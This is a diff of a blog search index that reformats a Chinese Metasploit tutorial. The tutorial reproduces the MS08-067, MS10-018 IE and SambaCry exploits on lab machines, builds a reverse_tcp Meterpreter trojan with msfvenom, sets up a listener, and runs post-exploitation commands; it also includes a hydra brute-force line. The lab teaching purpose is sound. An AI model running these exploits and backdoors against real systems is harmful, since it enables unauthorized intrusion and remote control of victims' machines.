@@ -4471,10 +4471,8 @@ hydra -t 3 -l admin -P password.txt -s 80 192.168.0.47 http-post-form &quot;/wz/
   <entry>
     <title>MSF的使用以及漏洞复现</title>
     <url>/2026/07/11/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/</url>
-    <content><![CDATA[MSF基础概述
-定义Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。
-安装目录（Kali默认）/usr/share/metasploit-framework/
-核心目录分工
+    <content><![CDATA[MSF基础概述一、定义Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。二、安装目录（Kali默认）/usr/share/metasploit-framework/三、核心目录分工
+
 
 
 目录
@@ -4502,8 +4500,13 @@ tools
 独立编码、漏洞分析小工具
 
 
+四、modules六大子模块详解
 
-modules六大子模块详解
+
+
+
+
+
 
 
 auxiliary：辅助模块，扫描、嗅探、弱口令爆破、漏洞探测
@@ -4585,7 +4588,7 @@ use
 exit退出 msf
 
 MSF 渗透测试MS08-067简介MS08-067 是Windows XP及部分旧版本Windows系统中著名的远程代码执行漏洞（CVE-2008-4250），存在于 Server服务的RPC请求处理 中。攻击者可通过 SMB（端口445） 发送特制RPC请求，触发 NetPathCanonicalize 函数的缓冲区溢出，从而在无需身份验证的情况下执行任意代码。该漏洞曾被蠕虫病毒 Conficker 大规模利用。
-命令行汇总# 1. 静默启动MSF控制台msfconsole -q# 2. 检索MS08-067漏洞模块search ms08-067# 3. 加载漏洞利用模块use exploit/windows/smb/ms08_067_netapi# 4. 查看模块所需配置参数show options# 5. 设置受害机IPset RHOSTS xxxx# 6. 执行漏洞攻击run# 7. 成功进入meterpreter后调出系统cmd命令行shell# 8. 返回meterpreter控制台exit
+命令行汇总1. 静默启动MSF控制台msfconsole -q2. 检索MS08-067漏洞模块search ms08-0673. 加载漏洞利用模块use exploit/windows/smb/ms08_067_netapi4. 查看模块所需配置参数show options5. 设置受害机IPset RHOSTS xxxx6. 执行漏洞攻击run7. 成功进入meterpreter后调出系统cmd命令行shell8. 返回meterpreter控制台exit
 攻击步骤环境：WinXP SP3，445端口开放前提条件：已知目标机的 IP 地址 192.168.23.136
 
 启动 MSF 框架，准备攻击，执行 msfconsole 命令
@@ -4611,7 +4614,7 @@ shell
 定期进行漏洞扫描与系统加固，避免使用已停止支持的操作系统。
 
 MS10-018 IE浏览器简介MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。利用方式：MSF搭建恶意网页服务，生成钓鱼URL诱导目标访问，后台监听等待上线
-命令行汇总# 1. 静默启动MSFmsfconsole -q# 2. 搜索MS10-018 IE漏洞模块search ms10-018# 3. 加载IE溢出利用模块use exploit/windows/browser/ms10_018_ie_behaviors# 4. 查看模块配置项show options# 5. 设置攻击机本机IP（生成钓鱼网页地址）set SRVHOST xxxx# 6. 选用正向连接载荷set PAYLOAD windows/meterpreter/bind_tcp# 7. 自定义受害机监听端口，规避4444默认特征set LPORT xxx# 8. 启动攻击服务run# 9. 查看所有被控主机会话sessions# 10. 接入ID为1的受害机会话sessions -i 1# 11. 调出目标系统cmd命令行shell# 12. 切回meterpreterexit
+命令行汇总1. 静默启动MSFmsfconsole -q2. 搜索MS10-018 IE漏洞模块search ms10-0183. 加载IE溢出利用模块use exploit/windows/browser/ms10_018_ie_behaviors4. 查看模块配置项show options5. 设置攻击机本机IP（生成钓鱼网页地址）set SRVHOST xxxx6. 选用正向连接载荷set PAYLOAD windows/meterpreter/bind_tcp7. 自定义受害机监听端口，规避4444默认特征set LPORT xxx8. 启动攻击服务run9. 查看所有被控主机会话sessions10. 接入ID为1的受害机会话sessions -i 111. 调出目标系统cmd命令行shell12. 切回meterpreterexit
 攻击步骤环境：WinXP IE6&#x2F;7前提条件：已知目标机的 IP 地址 192.168.23.136
 
 启动 MSF ，准备攻击，执行 msfconsole 命令
@@ -4683,7 +4686,7 @@ shell
 开启DEP&#x2F;ASLR内存保护。
 
 CVE-2017-7494 SambaCry（Linux永恒之蓝）简介CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。漏洞的核心在于 Samba 的 is_known_pipename () 函数中存在字符过滤问题 ，导致攻击者可以向共享目录传递恶意文件，从而被远程代码执行。  
-命令行汇总# 1. 启动MSF控制台 msfconsole -q # 2. 搜索漏洞模块 search CVE-2017-7494 # 3. 加载漏洞利用模块 use exploit/linux/samba/is_known_pipename # 4. 设置目标IP set RHOSTS xxxx # 5. 执行攻击 run
+命令行汇总1. 启动MSF控制台 msfconsole -q 2. 搜索漏洞模块 search CVE-2017-7494 3. 加载漏洞利用模块 use exploit/linux/samba/is_known_pipename 4. 设置目标IP set RHOSTS xxxx 5. 执行攻击 run
 攻击步骤
 环境搭建：Vulhub搭建Samba 3.5~4.6.4
 搭建 Vulhub 靶场前提：Ubuntu 宿主机预先安装 git、docker、docker-compose；通过 git 下载 vulhub 源码包；操作时切换 root 权限，进入对应漏洞目录，执行 docker-compose up -d 后台启动漏洞容器。  
@@ -4710,19 +4713,17 @@ CVE-2017-7494 SambaCry（Linux永恒之蓝）简介CVE-2017-7494，也被称为 
 ifconfig
 3. 启动 MSF
 msfconsole -q
-2. 搜索漏洞模块
+二、搜索漏洞模块
 search CVE-2017-7494
-3. 加载SambaCry漏洞的攻击模块
+三、加载SambaCry漏洞的攻击模块
 use 0
-4. 查看当前模块需要配置的参数
+四、查看当前模块需要配置的参数
 show options
-5. 设置远程受害主机IP
+五、设置远程受害主机IP
 set RHOSTS 192.168.23.135
-6. 执行攻击
+六、执行攻击
 run
-
-启动命令行
-
+七、启动命令行
 id
 
 防御
@@ -4741,20 +4742,14 @@ LPORT 攻击机开启监听的端口
 -o 保存生成的后门文件（output）
 
 基础语法msfvenom -p 载荷 LHOST=攻击机IP LPORT=监听端口 -f 格式 -o 输出文件
-Windows木马示例
-查看攻击机的 IP 192.168.23.131
-msfvenom 生成Windows反弹木马
-
+Windows木马示例一、查看攻击机的 IP 192.168.23.131二、msfvenom 生成Windows反弹木马
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.23.131 lport=9999 -f exe &gt;hello.exe
 
 -p windows/meterpreter/reverse_tcp：载荷，Windows反弹Meterpreter
 LHOST=192.168.23.131：攻击机Kali的IP，靶机主动连接该地址
 LPORT=9999：靶机连接攻击机的端口
 -f exe：输出格式为Windows可执行程序
-&gt; hello.exe：将内容输出保存为hello.exe（等价 -o hello.exe）
-
-
-监听
+&gt; hello.exe：将内容输出保存为hello.exe（等价 -o hello.exe）三、监听
 
 msfconsole -quse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 0.0.0.0set lport 9999exploit -j
 
@@ -4763,16 +4758,12 @@ use exploit/multi/handler：加载监听模块，等待反弹连接(reverse_tcp�
 set payload：载荷必须和木马生成时完全一致
 set LHOST 0.0.0.0：监听本机所有网卡
 set LPORT 9999：监听端口，必须和木马端口保持统一
-exploit -j：-j &#x3D; job后台运行监听，不会占用当前窗口
-
-
-把木马放到靶机并运行hello.exe，成功得到meterpreter &gt; 后执行
-查看后台任务与对话
+exploit -j：-j &#x3D; job后台运行监听，不会占用当前窗口四、把木马放到靶机并运行hello.exe，成功得到meterpreter &gt; 后执行五、查看后台任务与对话
 
 sessions
 
 sessions -i 1
-6. 实现远程控制
+六、实现远程控制
 screenshot      # 对受害主机屏幕截图
 
 shell           # 调出目标原生cmd命令行ipconfig
